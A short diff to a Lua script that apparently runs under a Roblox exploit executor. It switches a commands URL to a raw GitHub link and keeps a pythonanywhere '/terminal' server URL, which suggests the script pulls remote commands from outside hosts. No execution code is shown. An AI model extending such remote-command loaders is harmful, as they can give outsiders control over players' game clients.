@@ -4,7 +4,7 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local HttpService = game:GetService("HttpService")
 
 local SERVER_URL = "https://Maxxi1mka.pythonanywhere.com/terminal"
-local COMMANDS_URL = "https://github.com/kotowkot314-cell/maksimka-robux/blob/main/commands.x.lua"
+local COMMANDS_URL = "https://raw.githubusercontent.com/kotowkot314-cell/maksimka-robux/main/commands.x.lua"
 
 local executorName = "Unknown"
 local httpFunc = nil
